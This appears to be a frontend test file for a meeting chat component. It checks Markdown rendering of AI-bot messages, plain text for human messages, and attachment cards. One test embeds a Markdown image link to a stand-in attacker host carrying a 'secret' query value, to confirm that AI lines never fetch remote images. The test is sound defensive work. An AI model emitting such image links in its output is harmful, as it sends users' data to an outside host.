import { describe, it, expect, vi } from 'vitest'
import { render, screen } from '@testing-library/react'
import type { MeetingMessage } from '@/lib/api/meeting-types'

vi.mock('next-intl', () => ({
  useTranslations: () => (key: string) => key,
}))
vi.mock('@/components/meeting/room/room-context', () => ({
  useRoom: () => ({ myId: 'me', myName: 'Me' }),
}))

import { ChatLine } from '@/components/meeting/room/MeetingChatLines'

const fmt = new Intl.DateTimeFormat('en', { timeStyle: 'short' })
const line = (userId: string, displayName: string | undefined, content: string): MeetingMessage =>
  ({ id: 'x', sender: displayName ? { userId, displayName } : { userId }, content, createdAt: '2026-11-06T10:00:00Z' })

describe('ChatLine AI', () => {
  it('renders the bot line as Markdown under the i18n name, never the id or server name', () => {
    const { container } = render(
      <ul><ChatLine message={line('ai-bot-000000000000000000000001', 'Server Name', 'a **bold** word')} showName timeFormat={fmt} /></ul>,
    )
    expect(container.querySelector('strong')?.textContent).toBe('bold')
    expect(screen.getByText('aiName')).toBeTruthy()
    expect(container.textContent).not.toContain('ai-bot-')
    expect(container.textContent).not.toContain('Server Name')
  })

  it('never renders an image from an AI line (no remote fetch)', () => {
    const { container } = render(
      <ul><ChatLine message={line('ai-bot-000000000000000000000001', undefined, 'see ![pic](https://evil.example/p.png?q=secret)')} showName timeFormat={fmt} /></ul>,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('pic')
  })

  it('keeps human lines plain text', () => {
    const { container } = render(
      <ul><ChatLine message={line('u2', 'Bob', 'a **bold** word')} showName timeFormat={fmt} /></ul>,
    )
    expect(container.querySelector('strong')).toBeNull()
    expect(container.textContent).toContain('a **bold** word')
  })
})

describe('ChatLine attachment', () => {
  const att = { url: '/api/uploads/abc', name: 'plan.pdf', size: 2048, contentType: 'application/pdf' }

  it('renders a file card (name, size, download link) and never the URL', () => {
    const { container } = render(
      <ul><ChatLine message={{ ...line('u2', 'Bob', 'look'), attachment: att }} showName timeFormat={fmt} /></ul>,
    )
    expect(screen.getByText('plan.pdf')).toBeTruthy()
    expect(screen.getByText('2.0 KB')).toBeTruthy()
    const a = container.querySelector('a')!
    expect(a.getAttribute('href')).toContain('/api/uploads/abc')
    expect(a.getAttribute('href')).toContain('download=true')
    expect(container.textContent).not.toContain('/api/uploads')
    expect(container.textContent).toContain('look')
  })

  it('hides the size when it is 0', () => {
    render(<ul><ChatLine message={{ ...line('u2', 'Bob', ''), attachment: { ...att, size: 0 } }} showName={false} timeFormat={fmt} /></ul>)
    expect(screen.getByText('plan.pdf')).toBeTruthy()
    expect(screen.queryByText(/\bB$/)).toBeNull()
  })

  it('a file-only line has no empty text bubble', () => {
    const { container } = render(
      <ul><ChatLine message={{ ...line('u2', 'Bob', ''), attachment: att }} showName={false} timeFormat={fmt} /></ul>,
    )
    expect(container.querySelector('a')).not.toBeNull()
    expect(container.querySelectorAll('li > p')).toHaveLength(0)
  })
})
